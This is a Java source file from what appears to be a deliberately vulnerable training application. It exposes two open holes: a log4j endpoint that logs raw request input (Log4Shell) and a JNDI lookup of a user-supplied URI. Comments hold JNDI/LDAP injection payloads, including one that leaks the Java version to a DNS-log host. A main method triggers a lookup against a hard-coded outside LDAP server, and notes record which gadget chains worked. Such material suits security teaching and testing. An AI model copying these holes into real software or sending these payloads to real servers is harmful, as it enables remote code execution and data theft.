package org.joychou.controller;

import javax.naming.InitialContext;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Log4j {

    private static final Logger logger = LogManager.getLogger("Log4j");

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j")
    public String log4j(@RequestBody String token) {
        logger.error(token);
        return token;
    }

    /**
     * http://localhost:8080/jndi with body: ${jndi:ldap://
     * @param url
     * @return
     */
    @RequestMapping(value = "/jndi")
    public String jndi(@RequestBody String uri) throws Exception {
        // String uri = "rmi://127.0.0.1:1099/Exploit";    // 指定查找的 uri 变量
        InitialContext ctx = new InitialContext();// 得到初始目录环境的一个引用
        ctx.lookup(uri); // 获取指定的远程对象
        return uri;
    }

    public static void main(String[] args) throws Exception {
        // String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
        // poc = "${jndi:ldap://${java.version}.72568b.ceye.io}";
        // logger.error(poc);

        // jdk 8u251
        // cb1链 可以打，但是命令执行了两次
        // jackson 动态代理链报错，javax.naming.NamingException [Root exception is java.io.InvalidClassException: com.fasterxml.jackson.databind.node.POJONode; class invalid for deserialization]; remaining name '69a761'
        String uri = "ldap://129.153.74.192:50389/db48ee";
        new Log4j().jndi(uri);
    }

}
